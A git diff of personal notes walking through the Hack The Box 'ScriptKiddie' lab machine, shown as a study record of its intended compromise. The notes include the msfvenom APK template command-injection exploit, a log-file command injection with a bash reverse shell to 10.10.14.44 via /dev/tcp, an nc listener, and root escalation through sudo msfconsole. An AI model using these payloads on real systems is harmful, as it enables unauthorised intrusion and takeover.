@@ -27,37 +27,32 @@ Nmap done: 1 IP address (1 host up) scanned in 43.17 seconds
 ![[Pasted image 20230219213432.png]]
 
 ### nmap
-127.0.0.1
+Trying 127.0.0.1
 ![[Pasted image 20230219213521.png]]
 the machine's nmap version is 7.80
 
 ### payloads
-difficult to get result
+difficult to get result, so skip it for now
 
 ### sploits
 seems like its searchsploit
 tried to put test in the box
 ![[Pasted image 20230219215606.png]]
 
-look at msfvenom venom it up is the keyword?
+look at msfvenom `venom it up` is the keyword?
 ![[Pasted image 20230219221158.png]]
 https://www.exploit-db.com/exploits/49491
 
-## create payload
-`searchsploit -m 49491`
-
-`cp /tmp/tmp3diped9_/evil.apk .`
-
-
-## metasploit
-
+## create payload through metasploit
+Set LHOST and LPORT then run the exploit.
 ```
 msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run
 
 [-] Exploit failed: cmd/unix/python/meterpreter/reverse_tcp: All encoders failed to encode.
 ```
+It did not work for some reason due to the payload.
 
-`show payloads`
+`show payloads` to show all the available shells and switch it to 38.
 ```
 TCP (via AWK)
    38  payload/cmd/unix/reverse_bash                                          normal  No     Unix Command Shell, Reverse 
@@ -73,14 +68,16 @@ msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > r
 [+] msf.apk stored at /home/kali/.msf4/local/msf.apk
 ```
 
-# Foothold
+Now, we have the apk file.
 
+# Foothold
 ## get the shell
+Apk file is for android, so we need to choose android.
 os: androld
 lhost: 10.10.14.44
 apk the one we just created
 
-kali 
+on kali 
 `nc -lnvp 1234`
 
 ## shell as kid
@@ -92,8 +89,8 @@ whoami
 kid
 ```
 
-# priv escalation
-## enumerate
+# Privilege escalation
+## enumeration
 
 ## /html
 has app.py written in flask
@@ -124,7 +121,6 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 ### /logs
 there is a file called hackers
-
 ```
 -rw-rw-r--  1 kid pwn    0 Feb 19 12:33 hackers
 ```
@@ -132,12 +128,13 @@ there is pwn?
 
 ### /pwn
 recon file and scanlosers.sh
-
 ```
 drwxrw---- 2 pwn  pwn  4096 Feb 19 12:50 recon
 -rwxrwxr-- 1 pwn  pwn   250 Jan 28  2021 scanlosers.sh
 ```
 no permission for recon but we can read scanlosers.sh
+
+## scriptkiddie -> pwn
 
 ```bash
 kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
@@ -154,35 +151,43 @@ done
 if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
 ```
 
-#### command injection
+### command injection
+https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html
 We can try to inject a command in this shell. Eventually what we want to do is that , since this is owned by pwn, so if we can run a command as pwn then we can get pwn's shell.
+
+#### command injection test
+```bash
+echo "[2021-05-28 12:37:32.655374] 10.10.14.15" > hackers; cat hackers; echo sleep; sleep 1; cat hackers; echo done
+```
 
 sh -c "" part runs nmap and it takes ip. we can append some sort of commands after ip, then we can run nmap and an arbitrary commands.
 
-```
+```shell
 cut -d' ' -f3-
 ```
 takes everything after the third word thats separated by a space.
 
-```
+```bash
 echo "x x x 127.0.0.1; ping -c 1 10.10.14.15 #" | cut -d' ' -f3-
+x 127.0.0.1; ping -c 1 10.10.14.15 #                                 
 ```
 
+The actual code becomes,
+```bash
+ sh -c "nmap --top-ports 10 -oN recon/x 127.0.0.1; ping -c 1 10.10.14.15 #.nmap ${ip} 2>&1 >/dev/null" &
+```
+
+We can try this payload 
+
+On scriptkiddie machine
+`echo "x x x 127.0.0.1; ping -c 1 10.10.14.15 #" > hackers`
+
+On kali machine
 `sudo tcpdump -i tun0 icmp`
 
-the payload would e
-```
-echo "  test|bash -c '/bin/bash -l > /dev/tcp/10.10.14.44/1234 0<&1 2>&1'" > hackers
-```
-
-
-## trying the log
-https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html
-```
-echo "[2021-05-28 12:37:32.655374] 10.10.14.15" > hackers; cat hackers; echo sleep; sleep 1; cat hackers; echo done
-```
-
-```
+## Reverse shell payload
+Actual payload
+```shell
 echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.44/1234 0>&1' # ." > hackers
 ```
 
@@ -190,7 +195,8 @@ listen on another shell to get pwn
 
 ## pwn -> root
 
-```
+### sudo -l
+```bash
 pwn@scriptkiddie:~$ sudo -l
 sudo -l
 Matching Defaults entries for pwn on scriptkiddie:
@@ -201,12 +207,13 @@ User pwn may run the following commands on scriptkiddie:
     (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
 ```
 
+### metasploit
 ```
 sudo /opt/metasploit-framework-6.0.9/msfconsole
 ```
 
+### get shell
 `msf6 > /bin/bash`
 
-### root flag
-
+## root flag
 go to `/root/root.txt`
